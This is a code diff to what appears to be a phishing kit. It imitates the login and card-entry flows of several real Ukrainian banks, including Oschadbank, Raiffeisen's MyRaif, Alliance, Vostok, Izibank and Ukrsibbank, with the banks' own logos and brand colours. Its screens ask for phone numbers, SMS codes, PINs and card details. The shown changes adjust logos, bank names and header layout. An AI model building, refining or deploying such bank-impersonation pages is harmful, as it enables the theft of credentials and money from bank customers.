@@ -485,29 +485,6 @@
             position: absolute; left: 50%; transform: translateX(-50%);
         }
         .alliance-header .alliance-header-logo { max-height: 30px; }
-        .alliance-header--vostok {
-            justify-content: center;
-            position: relative;
-            min-height: 60px;
-        }
-        .alliance-header--vostok .title {
-            display: none;
-        }
-        .alliance-header--vostok .alliance-header-logo {
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
-            max-height: 40px;
-            max-width: 80%;
-        }
-        .alliance-header--vostok .back-arrow {
-            position: absolute;
-            left: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            z-index: 2;
-        }
         .alliance-content-wrapper {
             flex-grow: 1;
             display: flex; flex-direction: column;
@@ -600,12 +577,12 @@
 document.addEventListener('DOMContentLoaded', () => {
     // --- CONFIG & STATE VARIABLES ---
     const bankFlows = {
-        'oschadbank': { name: 'Ощад24', logoUrl: 'https://play-lh.googleusercontent.com/zxDvwiPM6X9CSEApukkevLayq6v41tkrRbtpjonL3MXAn_35xwEVOoHLh0veRa_8D94', theme: 'oschadbank' },
-        'raiffeisen': { name: 'MyRaif', logoUrl: 'https://play-lh.googleusercontent.com/c19N2AtbGM_cRT3ShxzKy1BB7mkLMVaae1HwwUAO0os1aZDKURnTyDXlOncMq7Cy_w', internalLogoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen', colors: { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' } },
+        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank' },
+        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen', colors: { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' } },
         'alliance': { name: 'Альянс', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/f/f1/Logo_Bank_Alliance.png', theme: 'alliance', colors: { primary: '#0072CE', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e9f2fa', borderColor: '#d1e3f5' } },
-        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', internalLogoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Vostok-bank-logo.svg/2560px-Vostok-bank-logo.svg.png', theme: 'vostok', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fdeee5', borderColor: '#fbd9c7' } },
-        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fef1e9', borderColor: '#fbe3d4' } },
-        'ukrsib': { name: 'Ukrsibbank', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', internalLogoUrl: 'https://ukrsibbank.com/wp-content/uploads/2024/04/logo_ukrsi_bl_v_e_q.png', theme: 'ukrsib', colors: { primary: '#00A14E', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e6f6ec', borderColor: '#cce9d9' } }
+        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fdeee5', borderColor: '#fbd9c7' } },
+        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', colors: { primary: '#F37021', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#fef1e9', borderColor: '#fbe3d4' } }, // ИЗМЕНЕНО: Цвет
+        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', colors: { primary: '#00A14E', bg: '#f4f8fc', text: '#212529', textSecondary: '#5a6a7b', btnBg: '#e6f6ec', borderColor: '#cce9d9' } }
     };
     
     const urlParams = new URLSearchParams(window.location.search);
@@ -674,16 +651,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- START ALLIANCE & OTHER LIGHT THEME BANK FLOW ---
     function renderAlliancePhoneScreen() {
         hideAllModals();
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
-        const headerClass = activeBankData.theme === 'vostok' ? 'alliance-header alliance-header--vostok' : 'alliance-header';
-
         const html = `
-            <div class="${headerClass}">
+            <div class="alliance-header">
                 <span class="back-arrow" id="alliance-back-btn">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="var(--alliance-text)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title"></span>
-                <img src="${logoSrc}" class="alliance-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
                 <div class="alliance-icon-container">
@@ -704,15 +678,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function renderAllianceCardScreen() {
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
-        const headerClass = activeBankData.theme === 'vostok' ? 'alliance-header alliance-header--vostok' : 'alliance-header';
         const html = `
-            <div class="${headerClass}">
+            <div class="alliance-header">
                 <span class="back-arrow" id="alliance-back-card-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="var(--alliance-text)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title"></span>
-                <img src="${logoSrc}" class="alliance-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
                 <div class="alliance-icon-container">
@@ -733,15 +705,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function renderLightThemedCardDetailsScreen() {
         hideAllModals();
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
-        const headerClass = activeBankData.theme === 'vostok' ? 'alliance-header alliance-header--vostok' : 'alliance-header';
         const html = `
-            <div class="${headerClass}">
+            <div class="alliance-header">
                 <span class="back-arrow" id="alliance-back-details-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="var(--alliance-text)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title"></span>
-                <img src="${logoSrc}" class="alliance-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
                 <div class="alliance-form-center-container">
@@ -851,14 +821,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- RAIFFEISEN BANK FLOW ---
     function renderRaiffPhoneScreen() {
         hideAllModals();
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
         const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title">Авторизуйтесь через MyRaif</span>
-                <img src="${logoSrc}" class="raiff-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper">
                 <div class="raiff-icon-container">
@@ -906,14 +875,13 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderRaiffSmsScreen(phone, options = {}) {
         lastCodeScreen = 'raiff_sms';
         let maskedPhone = phone.slice(0, 7) + '***' + phone.slice(10);
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
         const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title">Авторизуйтесь через MyRaif</span>
-                <img src="${logoSrc}" class="raiff-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper">
                 <div class="raiff-icon-container">
@@ -961,14 +929,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     function renderRaiffPinScreen(options = {}) {
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
         const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title">Авторизуйтесь через MyRaif</span>
-                <img src="${logoSrc}" class="raiff-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper">
                 <div class="raiff-icon-container" style="margin: 20px 0 20px;">
@@ -1024,8 +991,6 @@ document.addEventListener('DOMContentLoaded', () => {
         hideAllModals();
         lastCodeScreen = 'generic_debit';
         const theme = activeBankData.colors || { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' };
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
-        const titleText = activeBankData.name;
         
         raiffModalOverlay.style.backgroundColor = theme.bg;
         
@@ -1034,8 +999,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${theme.text}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                <span class="title" style="color: ${theme.text};">${titleText}</span>
-                 <img src="${logoSrc}" class="raiff-header-logo" alt="Логотип банку">
+                <span class="title" style="color: ${theme.text};">${activeBankData.name}</span>
+                 <img src="${activeBankData.logoUrl}" class="raiff-header-logo" alt="Логотип банку">
             </div>
             <div class="raiff-content-wrapper" style="color: ${theme.text};">
                 <div class="raiff-icon-container">
@@ -1076,15 +1041,13 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderThemedLightDebitScreen(options = {}) {
         hideAllModals();
         lastCodeScreen = 'generic_light_debit';
-        const logoSrc = activeBankData.internalLogoUrl || activeBankData.logoUrl;
-        const headerClass = activeBankData.theme === 'vostok' ? 'alliance-header alliance-header--vostok' : 'alliance-header';
         const html = `
-            <div class="${headerClass}">
+            <div class="alliance-header">
                 <span class="back-arrow" id="alliance-debit-back-btn">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="var(--alliance-text)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
                 <span class="title"></span>
-                <img src="${logoSrc}" class="alliance-header-logo" alt="Логотип банку">
+                <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
                  <div class="alliance-icon-container">
